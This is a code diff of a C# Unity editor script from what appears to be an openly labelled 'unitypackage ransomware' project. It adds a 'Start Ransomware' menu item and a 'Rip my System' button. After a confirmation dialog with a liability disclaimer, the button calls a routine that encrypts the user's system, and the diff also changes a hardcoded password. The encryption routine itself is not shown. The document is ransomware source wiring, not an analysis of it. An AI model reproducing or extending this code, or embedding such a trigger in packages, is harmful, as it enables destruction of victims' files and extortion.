@@ -1,11 +1,6 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
-using UnityEditor;
-using UnityEngine; 
+﻿using UnityEditor;
+using UnityEngine;
+using UnityExample.ThreadHandler;
 
 //Unity is Requred for this.
 
@@ -14,7 +9,7 @@ namespace UnityExample
     [InitializeOnLoad]
     public class Main : EditorWindow
     {
-        [MenuItem("Unity Ransomware Example/Start Encrypt Files", false, 500)]
+        [MenuItem("Unity Ransomware Example/Start Ransomware", false, 500)]
         
         public static void ShowWindow()
         {
@@ -32,18 +27,14 @@ namespace UnityExample
             {
                 Application.OpenURL("https://github.com/none-development/unitypackage-ransomware");
             }
-            GUILayout.Label("Press this Button to Start Encrypt you System. Salt: 35, Password: Mei . For Encrypt please use this.");
-            if (GUILayout.Button("Run Ransomware"))
+            GUILayout.Label("Press this Button to Start Encrypt you System. Salt: 35, Password: Test1234 . For Encrypt please use this.");
+            if (GUILayout.Button("Rip my System"))
             {
-                switch (EditorUtility.DisplayDialogComplex(".unity Ransomware", "Do you really want to run the Ransomeware? Meichan assumes no liability for damage to property during the execution of this script.", "Yes, start Ransomware", "No, dont Start", null))
+                switch (EditorUtility.DisplayDialogComplex(".unitypackage Ransomware", "Do you really want to run the Ransomeware? None assumes no liability for damage to property during the execution of this script.", "Yes, start Ransomware", "No, dont Start", null))
                 {
                     case 0:
-                        Thread thread = new Thread(() =>
-                        {
-                            UnityExample.encrypter.Startencrypt(true);
-                        });
-                        thread.Start();
-
+                        //Start the encrypt Process
+                        Crypto.Startencrypt(true);
                         break;
                     case 1:
                         break;
